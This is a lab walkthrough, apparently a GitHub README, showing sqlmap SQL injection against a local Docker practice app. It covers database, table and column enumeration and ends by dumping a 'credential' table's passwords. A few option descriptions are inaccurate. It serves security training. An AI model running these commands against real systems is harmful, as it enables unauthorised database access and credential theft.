# Attacking Sql Injection
## Prepared the eviroment .
1. Dowload sqlmap in  Linux
```bash
 sudo apt install sqlmap
```
- Clone project
```bash
git clone https://github.com/NMCuonG08/SqlMap.git
```
2. Attacking
 
Open Docker desktop and open your terminal 

```bash
cd SqlMap
```  
```bash
docker-compose up -d
```  
 
![image](https://github.com/user-attachments/assets/21bfbdef-92ff-43bf-aa56-c6ba264b5953)

-  Enter a random value to login and get an url `http://localhost:3128/unsafe_home.php?username=1&Password=1`

![image](https://github.com/user-attachments/assets/44aa0edc-9229-46e1-8b8e-11869bff24fb)

- option `-u`:  Target URL
- opntion `--batch` : Automatically decide on the best payloads to use

  ```bash
  sqlmap -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" --batch
  ```
![image](https://github.com/user-attachments/assets/e9869cb7-ccca-4145-be81-90aca41cada5)

- option `--dbs`:  Force back-end DBMS to provided value

  ```bash
   sqlmap -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" --batch --dbs
  ```
  
![image](https://github.com/user-attachments/assets/6e7245d6-a1b8-49c5-b89e-cc39bdfc5459)

- option `-D` and `--tables`: DBMS database to enumerate and Enumerate DBMS database tables

```bash
  sqlmap -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" --batch -D sqllab_users --tables
```

![image](https://github.com/user-attachments/assets/9a9e257a-7b84-4e66-9832-38ffc2e557b9)

- option `-T` and `--columns`: Enumerate DBMS database tables and  DBMS database table(s) to enumerate

```bash
sqlmap -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" --batch -D sqllab_users -T credential --columns
```

![image](https://github.com/user-attachments/assets/16c04b4b-699c-4d4c-9351-32d7213ab98a)

- option `--dump`:   Dump DBMS database table entries

```bash
sqlmap -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" --batch -D sqllab_users -T credential --columns --dump
```

![image](https://github.com/user-attachments/assets/e01f8355-5301-48d4-bd70-3755f18f02fd)


- opntion `-C COL `: DBMS database table column(s) to enumerate

```bash
   sqlmap -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" --batch -D sqllab_users -T credential --columns -C Password --dump
```

![image](https://github.com/user-attachments/assets/026557fa-3b30-4de5-a914-c4bc802a86de)







